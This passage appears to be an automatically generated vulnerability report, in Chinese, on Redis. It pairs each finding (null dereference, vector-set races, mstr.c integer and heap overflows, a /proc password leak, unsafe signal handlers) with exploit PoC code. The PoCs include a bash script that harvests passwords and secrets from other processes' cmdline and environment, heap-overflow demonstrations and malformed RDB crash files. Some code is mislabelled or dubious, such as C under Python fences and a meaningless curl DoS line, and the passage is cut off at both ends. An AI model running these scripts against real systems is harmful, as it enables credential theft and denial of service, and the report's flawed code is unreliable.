int main() {
    printf("========================================\n");
    printf("  PoC - 仅供安全研究使用\n");
    printf("  漏洞ID: VULN-84C00D59\n");
    printf("  类型: 空指针解引用\n");
    printf("========================================\n\n");
    
    /* 注册SIGSEGV信号处理 */
    signal(SIGSEGV, sigsegv_handler);
    
    /* 设置内存限制以模拟内存压力 */
    struct rlimit old_limit, new_limit;
    getrlimit(RLIMIT_AS, &old_limit);
    
    printf("[*] 步骤1: 设置内存限制以触发内存分配失败\n");
    new_limit.rlim_cur = 1024 * 1024;  /* 1MB限制 */
    new_limit.rlim_max = 1024 * 1024;
    
    if (setrlimit(RLIMIT_AS, &new_limit) != 0) {
        perror("setrlimit");
        printf("[*] 使用替代方法: 直接模拟内存耗尽\n");
        memory_exhausted = 1;
    }
    
    printf("[*] 步骤2: 调用有漏洞的函数\n");
    printf("[*] 预期: 空指针解引用导致崩溃\n\n");
    
    /* 触发漏洞 */
    const char *test_str = "test";
    vulnerable_function(test_str, 4, 0);
    
    /* 如果程序没有崩溃，说明漏洞未触发 */
    printf("\n[!] 漏洞未触发 - 可能需要更严格的内存限制\n");
    
    /* 恢复内存限制 */
    setrlimit(RLIMIT_AS, &old_limit);
    
    return 0;
}

/*
 * 实际利用场景 (针对Redis模块):
 * 
 * 1. 攻击者发送大量内存密集型请求，耗尽Redis进程可用内存
 * 2. 当内存不足时，exprNewToken调用RedisModule_Alloc失败返回NULL
 * 3. 代码直接访问t->str成员，触发空指针解引用
 * 4. Redis进程崩溃，导致拒绝服务
 *
 * 利用curl命令模拟:
 * curl -X POST http://target:6379/ \
 *   -H "Content-Type: application/json" \
 *   -d '{"field": "value"}' \
 *   --limit-rate 100M  # 大量并发请求耗尽内存
 */
```

---

### VULN-300C1B17 - 并发竞争条件 - 线程安全漏洞

- **严重等级:** HIGH
- **文件位置:** `modules\vector-sets\vset.c:1`
- **数据流:** 文档中描述了多个线程安全问题和竞态条件：
1. 从创建线程到线程实际获取锁之间存在时间窗口，在此期间DEL/expire可能触发并删除对象
2. 使用原子计数器保护对象，但文档承认存在潜在问题
3. 主线程中的读操作（VCARD, VEMB, VRANDMEMBER等）不获取任何锁
4. 后台线程修改读槽元数据（node->visited_epoch[slot]）
- **判断理由:** 代码文档明确描述了多个竞态条件问题：
1. 线程创建和锁获取之间的时间窗口可能导致对象被删除后线程仍在访问
2. 主线程读操作不获取锁，可能读取到后台线程正在修改的不一致数据
3. 文档承认当前解决方案存在潜在问题，并讨论了替代方案但未实施
4. 虽然文档声称某些操作是安全的，但这种依赖复杂时序假设的设计容易引入难以发现的bug

**代码片段:**
```
/* ... threading model documentation ... */

struct vsetObject {
    HNSW *hnsw;
    RedisModuleDict *dict;
    float *proj_matrix;
    uint32_t proj_input_size;
    pthread_rwlock_t in_use_lock;
    uint64_t id;
    uint64_t numattribs;
    atomic_int thread_creation_pending;
};
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-300C1B17 - Vector Sets Thread Safety Race Condition
仅供研究使用 - For Research Purposes Only

This PoC demonstrates the race condition between thread creation and object deletion.
"""

import redis
import threading
import time
import random

# 前置条件：需要Redis实例加载了vector-sets模块
REDIS_HOST = 'localhost'
REDIS_PORT = 6379

def exploit_race_condition():
    """
    利用线程创建与锁获取之间的时间窗口
    通过并发执行DEL和VSIM操作来触发竞态条件
    """
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT)
    
    # 步骤1: 创建测试向量集
    key_name = "test_vset_race_" + str(random.randint(10000, 99999))
    
    # 创建向量集并添加一些向量
    r.execute_command("VADD", key_name, "item1", "1,2,3,4,5")
    r.execute_command("VADD", key_name, "item2", "2,3,4,5,6")
    r.execute_command("VADD", key_name, "item3", "3,4,5,6,7")
    
    print(f"[*] Created vector set: {key_name}")
    
    # 步骤2: 并发执行VSIM（触发后台线程）和DEL
    def vsim_operation():
        """执行VSIM操作，触发后台线程"""
        try:
            # VSIM会创建后台线程进行搜索
            result = r.execute_command(
                "VSIM", key_name, "2,3,4,5,6", 
                "COUNT", 2
            )
            print(f"[+] VSIM completed: {result}")
        except Exception as e:
            print(f"[-] VSIM error (expected during race): {e}")
    
    def del_operation():
        """执行DEL操作，尝试在后台线程运行时删除对象"""
        try:
            # 在VSIM后台线程启动但尚未获取锁时删除对象
            time.sleep(0.001)  # 微小的延迟以增加竞态窗口
            r.delete(key_name)
            print(f"[+] DEL completed on {key_name}")
        except Exception as e:
            print(f"[-] DEL error: {e}")
    
    # 步骤3: 启动并发线程
    threads = []
    
    # 启动多个VSIM线程
    for i in range(5):
        t = threading.Thread(target=vsim_operation)
        threads.append(t)
        t.start()
    
    # 在VSIM线程启动后立即执行DEL
    del_thread = threading.Thread(target=del_operation)
    del_thread.start()
    threads.append(del_thread)
    
    # 等待所有线程完成
    for t in threads:
        t.join()
    
    print("[*] Race condition exploit attempt completed")

def exploit_read_without_lock():
    """
    利用主线程读操作不获取锁的问题
    在后台线程修改数据时执行读操作
    """
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT)
    
    key_name = "test_vset_read_race_" + str(random.randint(10000, 99999))
    
    # 创建向量集
    r.execute_command("VADD", key_name, "item1", "1,2,3,4,5")
    r.execute_command("VADD", key_name, "item2", "2,3,4,5,6")
    r.execute_command("VADD", key_name, "item3", "3,4,5,6,7")
    
    print(f"[*] Created vector set: {key_name}")
    
    def background_vsim():
        """后台线程执行VSIM，修改read slot元数据"""
        try:
            r.execute_command(
                "VSIM", key_name, "2,3,4,5,6",
                "COUNT", 3
            )
        except:
            pass
    
    def foreground_reads():
        """主线程执行读操作（不获取锁）"""
        try:
            # VCARD - 不获取锁
            card = r.execute_command("VCARD", key_name)
            print(f"[+] VCARD (no lock): {card}")
            
            # VEMB - 不获取锁
            emb = r.execute_command("VEMB", key_name, "item1")
            print(f"[+] VEMB (no lock): {emb}")
            
            # VRANDMEMBER - 不获取锁
            rand = r.execute_command("VRANDMEMBER", key_name)
            print(f"[+] VRANDMEMBER (no lock): {rand}")
        except Exception as e:
            print(f"[-] Read operation error: {e}")
    
    # 并发执行后台线程和前台读操作
    bg_thread = threading.Thread(target=background_vsim)
    fg_thread = threading.Thread(target=foreground_reads)
    
    bg_thread.start()
    time.sleep(0.0005)  # 微调时序以增加竞态窗口
    fg_thread.start()
    
    bg_thread.join()
    fg_thread.join()
    
    print("[*] Read without lock exploit attempt completed")

def exploit_atomic_counter_race():
    """
    利用原子计数器保护机制的缺陷
    通过大量并发操作触发计数器竞争
    """
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT)
    
    key_name = "test_vset_atomic_race_" + str(random.randint(10000, 99999))
    
    # 创建向量集
    r.execute_command("VADD", key_name, "item1", "1,2,3,4,5")
    
    print(f"[*] Created vector set: {key_name}")
    
    def rapid_vsim():
        """快速连续执行VSIM操作"""
        for i in range(10):
            try:
                r.execute_command(
                    "VSIM", key_name, "2,3,4,5,6",
                    "COUNT", 1
                )
            except:
                pass
    
    def rapid_del_create():
        """快速删除并重新创建向量集"""
        for i in range(5):
            try:
                r.delete(key_name)
                time.sleep(0.001)
                r.execute_command("VADD", key_name, f"new_item_{i}", "1,2,3,4,5")
            except:
                pass
    
    # 启动多个并发线程
    threads = []
    for i in range(3):
        t = threading.Thread(target=rapid_vsim)
        threads.append(t)
        t.start()
    
    t = threading.Thread(target=rapid_del_create)
    threads.append(t)
    t.start()
    
    for t in threads:
        t.join()
    
    print("[*] Atomic counter race exploit attempt completed")

if __name__ == "__main__":
    print("=" * 60)
    print("PoC for VULN-300C1B17 - Vector Sets Thread Safety Race Condition")
    print("仅供研究使用 - For Research Purposes Only")
    print("=" * 60)
    
    print("\n[Phase 1] Exploiting thread creation vs lock acquisition race...")
    try:
        exploit_race_condition()
    except Exception as e:
        print(f"[-] Phase 1 failed: {e}")
    
    print("\n[Phase 2] Exploiting read without lock...")
    try:
        exploit_read_without_lock()
    except Exception as e:
        print(f"[-] Phase 2 failed: {e}")
    
    print("\n[Phase 3] Exploiting atomic counter race...")
    try:
        exploit_atomic_counter_race()
    except Exception as e:
        print(f"[-] Phase 3 failed: {e}")
    
    print("\n[*] All exploit attempts completed")
```

---

### VULN-30FAF02F - 整数溢出/缓冲区溢出

- **严重等级:** CRITICAL
- **文件位置:** `src\mstr.c:37`
- **数据流:** 用户控制的lenStr参数 -> mstrNew函数 -> 加法运算 -> assert检查
- **判断理由:** 使用assert进行整数溢出检查存在严重问题。在Release构建中assert会被移除，导致整数溢出检查完全失效。当lenStr接近SIZE_MAX时，加法运算可能溢出，导致分配的内存远小于预期，后续memcpy操作会造成堆缓冲区溢出。

**代码片段:**
```
assert(lenStr + mstrHdr + 1 > lenStr); /* Catch size_t overflow */
```

**PoC代码:**
```python
/*
 * PoC for VULN-30FAF02F - Integer Overflow in mstrNew()
 * 仅供研究使用 - For Research Purposes Only
 * 
 * 编译命令: gcc -O2 -DNDEBUG -o poc_mstr_overflow poc_mstr_overflow.c -I./src
 * 注意: -DNDEBUG 模拟Release构建，禁用assert
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

/* 模拟目标库的头文件引用 */
/* 实际利用时需要链接目标库 */

/* 模拟mstr.h中的关键定义 */
#define NULL_SIZE 1
#define MSTR_TYPE_5 0
#define MSTR_TYPE_8 1
#define MSTR_TYPE_16 2
#define MSTR_TYPE_64 3

/* 模拟mstr结构 */
typedef char* mstr;

/* 模拟mstrHdrSize函数 */
static inline int mstrHdrSize(char type) {
    switch(type) {
        case MSTR_TYPE_5: return 1;
        case MSTR_TYPE_8: return sizeof(uint8_t) + 1;
        case MSTR_TYPE_16: return sizeof(uint16_t) + 1;
        case MSTR_TYPE_64: return sizeof(uint64_t) + 1;
        default: return 1;
    }
}

/* 模拟mstrReqType函数 */
static inline char mstrReqType(size_t string_size) {
    if (string_size < 32) return MSTR_TYPE_5;
    if (string_size < 256) return MSTR_TYPE_8;
    if (string_size < 65536) return MSTR_TYPE_16;
    return MSTR_TYPE_64;
}

/* 模拟内存分配函数 - 用于演示溢出效果 */
static void* vulnerable_malloc_usable(size_t size, size_t *usable) {
    void *ptr = malloc(size);
    if (usable) *usable = size;
    printf("[ALLOC] 请求分配 %zu 字节, 实际分配 %p\n", size, ptr);
    return ptr;
}

/* 模拟存在漏洞的mstrNew函数 (Release版本) */
mstr mstrNew_vulnerable(const char *initStr, size_t lenStr, int trymalloc, size_t *usable) {
    unsigned char *pInfo;
    void *sh;
    mstr s;
    char type = mstrReqType(lenStr);
    int mstrHdr = mstrHdrSize(type);

    /* 漏洞点: assert在Release构建中被移除 */
    /* assert(lenStr + mstrHdr + 1 > lenStr); // Catch size_t overflow */
    /* 在Release构建中，这行代码完全不存在！ */

    /* 整数溢出发生在这里 */
    size_t len = mstrHdr + lenStr + NULL_SIZE;
    
    printf("[VULN] lenStr = %zu (0x%zx)\n", lenStr, lenStr);
    printf("[VULN] mstrHdr = %d\n", mstrHdr);
    printf("[VULN] 计算出的len = %zu (0x%zx)\n", len, len);
    
    /* 由于整数溢出，len可能远小于lenStr */
    if (len < lenStr) {
        printf("[!] 整数溢出检测: len(%zu) < lenStr(%zu)\n", len, lenStr);
    }

    sh = vulnerable_malloc_usable(len, usable);
    if (sh == NULL) return NULL;

    s = (char*)sh + mstrHdr;
    
    /* 后续的memcpy操作会溢出 */
    if (initStr && lenStr) {
        printf("[!] 即将执行memcpy: 目标缓冲区大小=%zu, 复制数据大小=%zu\n", len - mstrHdr, lenStr);
        printf("[!] 这将导致堆缓冲区溢出！\n");
        memcpy(s, initStr, lenStr);  /* 缓冲区溢出！ */
    }

    s[lenStr] = '\0';  /* 越界写入 */
    return s;
}

int main() {
    printf("========================================\n");
    printf("PoC: VULN-30FAF02F - 整数溢出/堆缓冲区溢出\n");
    printf("仅供研究使用 - For Research Purposes Only\n");
    printf("========================================\n\n");

    /* 构造触发整数溢出的lenStr值 */
    /* 目标: lenStr + mstrHdr + 1 溢出为很小的值 */
    /* 对于64位系统，SIZE_MAX = 0xFFFFFFFFFFFFFFFF */
    
    /* 场景1: 使用接近SIZE_MAX的值 */
    printf("\n--- 场景1: lenStr = SIZE_MAX - 10 ---\n");
    size_t lenStr1 = SIZE_MAX - 10;
    char *dummy_data1 = malloc(100);
    memset(dummy_data1, 'A', 99);
    dummy_data1[99] = '\0';
    
    mstr result1 = mstrNew_vulnerable(dummy_data1, lenStr1, 0, NULL);
    if (result1) {
        printf("[!] 成功触发溢出！\n");
        free(result1 - mstrHdrSize(mstrReqType(lenStr1)));
    }
    free(dummy_data1);

    /* 场景2: 精确计算触发值 */
    printf("\n--- 场景2: 精确计算溢出值 ---\n");
    /* 对于MSTR_TYPE_64, mstrHdr = 9 (8字节长度 + 1字节info) */
    /* 需要: lenStr + 9 + 1 溢出为小值 */
    /* 例如: 0xFFFFFFFFFFFFFFF6 + 10 = 0 (溢出到0) */
    size_t lenStr2 = SIZE_MAX - 9;  /* 使得 lenStr + 9 + 1 = SIZE_MAX + 1 = 0 */
    
    printf("尝试lenStr = 0x%zx\n", lenStr2);
    printf("计算: %zu + %d + %d = %zu\n", lenStr2, 9, 1, lenStr2 + 9 + 1);
    
    char *dummy_data2 = malloc(100);
    memset(dummy_data2, 'B', 99);
    dummy_data2[99] = '\0';
    
    mstr result2 = mstrNew_vulnerable(dummy_data2, lenStr2, 0, NULL);
    if (result2) {
        printf("[!] 成功触发溢出！\n");
        free(result2 - mstrHdrSize(mstrReqType(lenStr2)));
    }
    free(dummy_data2);

    /* 场景3: 实际利用 - 覆盖堆元数据 */
    printf("\n--- 场景3: 堆布局操纵 ---\n");
    printf("此场景展示如何利用溢出覆盖相邻堆块\n");
    
    /* 分配一个目标堆块 */
    char *target = malloc(64);
    memset(target, 'T', 63);
    target[63] = '\0';
    printf("目标堆块地址: %p\n", target);
    
    /* 分配漏洞堆块（小缓冲区） */
    size_t evil_lenStr = SIZE_MAX - 8;  /* 导致分配极小缓冲区 */
    char *evil_data = malloc(256);
    memset(evil_data, 'E', 255);
    evil_data[255] = '\0';
    
    printf("触发漏洞...\n");
    mstr evil_result = mstrNew_vulnerable(evil_data, evil_lenStr, 0, NULL);
    
    /* 检查目标堆块是否被覆盖 */
    printf("目标堆块内容: ");
    for (int i = 0; i < 64; i++) {
        printf("%02x ", (unsigned char)target[i]);
    }
    printf("\n");
    
    if (target[0] == 'E') {
        printf("[!] 成功: 目标堆块被溢出数据覆盖！\n");
    }
    
    free(evil_data);
    if (evil_result) free(evil_result - mstrHdrSize(mstrReqType(evil_lenStr)));
    free(target);

    printf("\n========================================\n");
    printf("PoC执行完毕\n");
    printf("========================================\n");

    return 0;
}
```

---

### VULN-C698F6B7 - 整数溢出

- **严重等级:** CRITICAL
- **文件位置:** `src\mstr.c:82`
- **数据流:** 用户控制的lenStr和kind参数 -> mstrNewWithMeta函数 -> 多个加法运算
- **判断理由:** 在mstrNewWithMeta函数中，多个size_t值相加没有进行溢出检查。如果lenStr、sumMetaLen等值过大，加法运算可能溢出，导致分配的内存不足，后续memcpy操作会写入超出分配内存的范围。

**代码片段:**
```
size_t allocLen = sumMetaLen + sizeof(mstrFlags) + mstrHdr + lenStr + NULL_SIZE;
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供安全研究使用
 * 漏洞: VULN-C698F6B7 - mstrNewWithMeta整数溢出
 * 目标: 展示通过整数溢出导致堆缓冲区溢出的利用路径
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* 模拟mstr库中的关键结构体和函数 */
typedef unsigned char mstrFlags;
typedef struct {
    int dummy;
} mstrKind;

#define NULL_SIZE 1
#define MSTR_TYPE_5 0
#define MSTR_TYPE_8 1
#define MSTR_TYPE_16 2
#define MSTR_TYPE_64 3

/* 模拟mstrHdrSize函数 */
static inline int mstrHdrSize(char type) {
    switch(type) {
        case MSTR_TYPE_5: return 0;
        case MSTR_TYPE_8: return sizeof(size_t) + 1;
        case MSTR_TYPE_16: return sizeof(uint16_t) + 1;
        case MSTR_TYPE_64: return sizeof(uint64_t) + 1;
        default: return 0;
    }
}

/* 模拟mstrReqType函数 */
static inline char mstrReqType(size_t string_size) {
    if (string_size < 32) return MSTR_TYPE_5;
    if (string_size < 256) return MSTR_TYPE_8;
    if (string_size < 65536) return MSTR_TYPE_16;
    return MSTR_TYPE_64;
}

/* 模拟mstrSumMetaLen函数 */
static inline int mstrSumMetaLen(mstrKind *k, mstrFlags flags) {
    /* 假设每个元数据块大小为32字节 */
    return flags * 32;
}

/* 模拟内存分配函数 */
static void* s_malloc_usable(size_t size, size_t *usable) {
    void *ptr = malloc(size);
    if (ptr && usable) *usable = size;
    printf("[DEBUG] 分配内存: %zu 字节 @ %p\n", size, ptr);
    return ptr;
}

/* 模拟memcpy操作 */
static void vulnerable_memcpy(void *dst, const void *src, size_t len) {
    printf("[DEBUG] memcpy: 目标=%p, 源=%p, 长度=%zu\n", dst, src, len);
    memcpy(dst, src, len);
}

/* 漏洞函数 - 模拟mstrNewWithMeta */
void* mstrNewWithMeta_vulnerable(mstrKind *kind, const char *initStr, 
                                  size_t lenStr, mstrFlags metaFlags, 
                                  int trymalloc, size_t *usable) {
    char type = mstrReqType(lenStr);
    int mstrHdr = mstrHdrSize(type);
    int sumMetaLen = mstrSumMetaLen(kind, metaFlags);
    
    /* 漏洞点: 多个size_t值相加没有溢出检查 */
    size_t allocLen = sumMetaLen + sizeof(mstrFlags) + mstrHdr + lenStr + NULL_SIZE;
    
    printf("\n=== 漏洞触发 ===\n");
    printf("sumMetaLen = %d\n", sumMetaLen);
    printf("sizeof(mstrFlags) = %zu\n", sizeof(mstrFlags));
    printf("mstrHdr = %d\n", mstrHdr);
    printf("lenStr = %zu\n", lenStr);
    printf("NULL_SIZE = %d\n", NULL_SIZE);
    printf("allocLen (溢出后) = %zu\n", allocLen);
    
    /* 分配内存 - 由于溢出，allocLen可能远小于实际需要 */
    void *allocMstr = s_malloc_usable(allocLen, usable);
    if (allocMstr == NULL) return NULL;
    
    /* 计算字符串指针位置 */
    mstrFlags *pMetaFlags = (mstrFlags *)((char*)allocMstr + sumMetaLen);
    void *mstrPtr = (char*)pMetaFlags + sizeof(mstrFlags) + mstrHdr;
    
    printf("分配内存范围: %p - %p\n", allocMstr, (char*)allocMstr + allocLen);
    printf("字符串写入位置: %p\n", mstrPtr);
    printf("字符串写入结束: %p\n", (char*)mstrPtr + lenStr);
    
    /* 漏洞利用: 使用原始的lenStr进行memcpy，超出分配范围 */
    if (initStr != NULL) {
        printf("\n[!] 执行溢出写入: memcpy到 %p, 长度 %zu\n", mstrPtr, lenStr);
        printf("[!] 溢出大小: %zu 字节\n", (size_t)((char*)mstrPtr + lenStr - (char*)allocMstr - allocLen));
        vulnerable_memcpy(mstrPtr, initStr, lenStr);
    }
    
    return allocMstr;
}

int main() {
    printf("========================================\n");
    printf("  PoC: mstrNewWithMeta 整数溢出漏洞\n");
    printf("  仅供安全研究使用\n");
    printf("========================================\n\n");
    
    mstrKind kind;
    
    /* 场景1: 基本溢出 - 使用大lenStr */
    printf("\n--- 场景1: 大lenStr导致溢出 ---\n");
    size_t large_len = (size_t)-1 - 100;  /* 接近SIZE_MAX */
    char *payload = malloc(1024);
    memset(payload, 'A', 1024);
    
    void *result1 = mstrNewWithMeta_vulnerable(&kind, payload, large_len, 0, 0, NULL);
    if (result1) free(result1);
    
    /* 场景2: 组合溢出 - 使用大metaFlags和lenStr */
    printf("\n--- 场景2: 组合参数导致溢出 ---\n");
    size_t moderate_len = 0x7FFFFFFF;  /* 约2GB */
    mstrFlags many_flags = 0xFF;  /* 255个元数据块 */
    
    void *result2 = mstrNewWithMeta_vulnerable(&kind, payload, moderate_len, many_flags, 0, NULL);
    if (result2) free(result2);
    
    /* 场景3: 精确溢出 - 使allocLen变为小值 */
    printf("\n--- 场景3: 精确控制溢出值 ---\n");
    /* 计算使allocLen溢出的值 */
    size_t target_len = (size_t)-1 - 200;  /* 使allocLen溢出到很小的值 */
    mstrFlags target_flags = 10;
    
    void *result3 = mstrNewWithMeta_vulnerable(&kind, payload, target_len, target_flags, 0, NULL);
    if (result3) free(result3);
    
    free(payload);
    
    printf("\n========================================\n");
    printf("  PoC执行完成\n");
    printf("  注意: 实际利用需要精确计算偏移\n");
    printf("========================================\n");
    
    return 0;
}
```

---

### VULN-9DABAFCA - 硬编码凭证 / 敏感信息泄露

- **严重等级:** LOW
- **文件位置:** `src\redis-benchmark.c:1`
- **数据流:** 命令行参数 `-a <password>` -> `config.conn_info.auth`。在 Unix 系统中，任何用户都可以读取 `/proc/<pid>/cmdline` 文件，从而获取密码。
- **判断理由:** 这是一个常见的信息泄露问题。虽然不算是代码本身的漏洞，但属于安全配置问题。建议通过环境变量或配置文件传递敏感信息，或者使用 `getpass()` 等函数从终端读取密码，避免在命令行中明文传递。

**代码片段:**
```
代码片段中未直接显示硬编码凭证，但 `config.conn_info.auth` 字段用于存储认证密码。如果该密码来自命令行参数（如 `-a`），它可能会在进程列表（`/proc/self/cmdline`）中暴露给其他用户。
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - Redis Benchmark密码泄露PoC
# 此PoC演示如何通过/proc文件系统获取redis-benchmark进程的认证密码

echo "[*] Redis Benchmark密码泄露PoC (仅供研究使用)"
echo ""

# 步骤1: 查找正在运行的redis-benchmark进程
BENCHMARK_PIDS=$(pgrep -x "redis-benchmark" 2>/dev/null)

if [ -z "$BENCHMARK_PIDS" ]; then
    echo "[-] 未找到正在运行的redis-benchmark进程"
    echo "[*] 请先启动redis-benchmark: redis-benchmark -a your_secret_password -h 127.0.0.1 -p 6379 -n 1000"
    exit 1
fi

echo "[+] 发现redis-benchmark进程，PID: $BENCHMARK_PIDS"
echo ""

# 步骤2: 读取进程的命令行参数
for PID in $BENCHMARK_PIDS; do
    echo "[*] 检查进程 $PID 的命令行参数..."
    
    # 检查/proc文件是否可读
    if [ -r "/proc/$PID/cmdline" ]; then
        # 读取并格式化命令行参数
        CMDLINE=$(cat /proc/$PID/cmdline | tr '\0' ' ')
        echo "[+] 进程 $PID 命令行: $CMDLINE"
        
        # 提取密码参数
        if echo "$CMDLINE" | grep -q "-a"; then
            PASSWORD=$(echo "$CMDLINE" | grep -oP '(?<=-a )\S+' || echo "$CMDLINE" | grep -oP '(?<=--auth )\S+')
            if [ -n "$PASSWORD" ]; then
                echo "[!] 发现敏感信息!"
                echo "[!] 认证密码: $PASSWORD"
                echo ""
                echo "[!] 攻击者可以利用此密码连接到Redis服务器"
                echo "[!] 示例: redis-cli -h 127.0.0.1 -p 6379 -a $PASSWORD"
            fi
        fi
    else
        echo "[-] 无法读取 /proc/$PID/cmdline (权限不足)"
    fi
    echo ""
done

# 步骤3: 演示其他信息泄露
for PID in $BENCHMARK_PIDS; do
    echo "[*] 检查进程 $PID 的环境变量..."
    if [ -r "/proc/$PID/environ" ]; then
        ENVIRON=$(cat /proc/$PID/environ | tr '\0' '\n' | grep -i "pass\|auth\|secret\|key" || echo "未发现敏感环境变量")
        if [ -n "$ENVIRON" ]; then
            echo "[!] 发现环境变量中的敏感信息:"
            echo "$ENVIRON"
        fi
    fi
done

echo ""
echo "[*] PoC完成"
echo "[*] 修复建议: 使用环境变量 REDIS_AUTH_PASSWORD 或配置文件传递密码"
```

---

### VULN-397B7D3A - 信号处理程序不安全

- **严重等级:** MEDIUM
- **文件位置:** `src/redis-check-rdb.c:130`
- **数据流:** 信号触发 -> 信号处理函数 -> rdbCheckError -> printf -> exit
- **判断理由:** 信号处理函数中调用了printf和exit，这些函数不是异步信号安全的。在信号处理上下文中调用非异步信号安全函数可能导致死锁、数据损坏或安全漏洞。正确的做法是使用write()等异步信号安全函数。

**代码片段:**
```
void rdbCheckHandleCrash(int sig, siginfo_t *info, void *secret) {
    UNUSED(sig);
    UNUSED(info);
    UNUSED(secret);
    rdbCheckError("Server crash checking the specified RDB file!");
    exit(1);
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-397B7D3A - 信号处理程序不安全
仅供研究使用

漏洞描述：
在 redis-check-rdb.c 中，信号处理函数 rdbCheckHandleCrash 调用了 rdbCheckError，
而 rdbCheckError 内部使用了 printf 和 exit，这些函数不是异步信号安全的。
在信号处理上下文中调用非异步信号安全函数可能导致死锁、数据损坏或安全漏洞。

利用原理：
通过构造一个特定的损坏RDB文件，当 redis-check-rdb 尝试解析该文件时，
会触发 SIGSEGV 信号，进而调用不安全的信号处理函数。
在特定条件下（如信号处理期间主程序持有锁），printf 和 exit 可能导致死锁或未定义行为。
"""

import struct
import os
import sys
import tempfile
import subprocess

# 仅供研究使用
print("=" * 60)
print("PoC: 信号处理程序不安全 (VULN-397B7D3A)")
print("仅供研究使用")
print("=" * 60)

# 构造一个损坏的RDB文件
# RDB文件格式：
# - 魔数: "REDIS" + 版本号 (4字节)
# - RDB体: 各种数据类型的编码
# - 校验和: 8字节
#
# 我们构造一个文件，使其在解析时触发内存访问违规

def create_corrupted_rdb():
    """
    构造一个损坏的RDB文件，该文件在解析时会触发SIGSEGV信号。
    
    利用思路：
    1. 构造一个看似合法的RDB文件头
    2. 在数据部分插入一个超大的长度字段，导致缓冲区溢出或无效内存访问
    3. 当redis-check-rdb尝试解析时，会触发SIGSEGV
    4. 信号处理函数被调用，但其中使用了非异步信号安全的printf和exit
    """
    
    # RDB文件头
    magic = b"REDIS"
    version = b"0009"  # RDB版本9
    
    # 构造一个损坏的数据段
    # 使用一个超大的字符串长度，导致内存访问越界
    # RDB编码: 类型字节 + 长度编码 + 字符串数据
    
    # 类型: 0x00 表示字符串
    rdb_type = b"\x00"
    
    # 长度编码: 使用特殊编码表示超大长度
    # RDB长度编码: 前两位表示编码方式
    # 00: 6位长度
    # 01: 14位长度
    # 10: 32位长度 (4字节)
    # 11: 特殊编码
    # 这里使用10编码，表示后面跟4字节长度
    length_prefix = b"\x80"  # 10 000000 -> 表示32位长度编码
    
    # 构造一个超大的长度值 (0xFFFFFFFF)
    # 这会导致尝试分配或访问超出实际文件大小的内存
    huge_length = struct.pack(">I", 0xFFFFFFFF)
    
    # 构造一个无效的指针值作为字符串数据
    # 当程序尝试解引用这个指针时，会触发SIGSEGV
    invalid_data = b"A" * 100  # 实际数据很少，但长度声称很大
    
    # 构造整个RDB文件
    rdb_content = magic + version
    rdb_content += rdb_type
    rdb_content += length_prefix + huge_length
    rdb_content += invalid_data
    
    # 添加一个伪造的校验和 (8字节)
    # 校验和是文件末尾的8字节，这里随便填
    checksum = b"\x00" * 8
    rdb_content += checksum
    
    return rdb_content


def create_corrupted_rdb_v2():
    """
    第二种构造方法：利用RDB解析中的整数溢出
    
    通过构造一个包含超大元素数量的集合/列表，
    导致在解析时分配超大内存或触发整数溢出，
    进而导致内存访问违规。
    """
    
    magic = b"REDIS"
    version = b"0009"
    
    # 类型: 0x02 表示集合 (set)
    rdb_type = b"\x02"
    
    # 集合元素数量: 使用超大值
    # 长度编码: 10表示32位长度
    length_prefix = b"\x80"
    huge_count = struct.pack(">I", 0x7FFFFFFF)  # 超大元素数量
    
    # 构造一个元素，但声称有大量元素
    element_type = b"\x00"  # 字符串类型
    element_len = b"\x05"   # 5字节长度
    element_data = b"hello"
    
    rdb_content = magic + version
    rdb_content += rdb_type
    rdb_content += length_prefix + huge_count
    rdb_content += element_type + element_len + element_data
    
    checksum = b"\x00" * 8
    rdb_content += checksum
    
    return rdb_content


def create_corrupted_rdb_v3():
    """
    第三种构造方法：利用RDB解析中的类型混淆
    
    通过构造一个类型字段为无效值的数据段，
    导致程序在类型查找表中越界访问。
    """
    
    magic = b"REDIS"
    version = b"0009"
    
    # 使用一个超出类型表范围的值
    # rdb_type_string 数组的大小约为30
    # 使用一个远大于此的值
    invalid_type = b"\xFF"  # 255，超出类型表范围
    
    # 即使类型无效，程序仍会尝试解析后续数据
    # 这可能导致在 rdbCheckError 中访问无效的类型名称
    
    rdb_content = magic + version
    rdb_content += invalid_type
    rdb_content += b"A" * 100  # 填充数据
    
    checksum = b"\x00" * 8
    rdb_content += checksum
    
    return rdb_content


def main():
    """
    主函数：创建损坏的RDB文件并尝试用redis-check-rdb解析
    """
    
    print("\n[+] 步骤1: 构造损坏的RDB文件...")
    
    # 创建多个测试文件
    test_files = []
    
    # 方法1: 超大长度
    rdb1 = create_corrupted_rdb()
    fd1, path1 = tempfile.mkstemp(suffix=".rdb", prefix="poc_corrupt_")
    with os.fdopen(fd1, 'wb') as f:
        f.write(rdb1)
    test_files.append(("超大长度", path1))
    print(f"    - 创建文件: {path1} (大小: {len(rdb1)} 字节)")
    
    # 方法2: 超大集合
    rdb2 = create_corrupted_rdb_v2()
    fd2, path2 = tempfile.mkstemp(suffix=".rdb", prefix="poc_corrupt_")
    with os.fdopen(fd2, 'wb') as f:
        f.write(rdb2)
    test_files.append(("超大集合", path2))
    print(f"    - 创建文件: {path2} (大小: {len(rdb2)} 字节)")
    
    # 方法3: 无效类型
    rdb3 = create_corrupted_rdb_v3()
    fd3, path3 = tempfile.mkstemp(suffix=".rdb", prefix="poc_corrupt_")
    with os.fdopen(fd3, 'wb') as f:
        f.write(rdb3)
    test_files.append(("无效类型", path3))
    print(f"    - 创建文件: {path3} (大小: {len(rdb3)} 字节)")
    
    print("\n[+] 步骤2: 尝试用redis-check-rdb解析损坏文件...")
    print("    (需要系统中已安装redis-check-rdb工具)")
    
    for name, path in test_files:
        print(f"\n    --- 测试: {name} ---")
        try:
            # 尝试运行redis-check-rdb
            result = subprocess.run(
                ["redis-check-rdb", path],
                capture_output=True,
                timeout=10
            )
            print(f"    返回码: {result.returncode}")
            print(f"    stdout: {result.stdout.decode('utf-8', errors='replace')[:200]}")
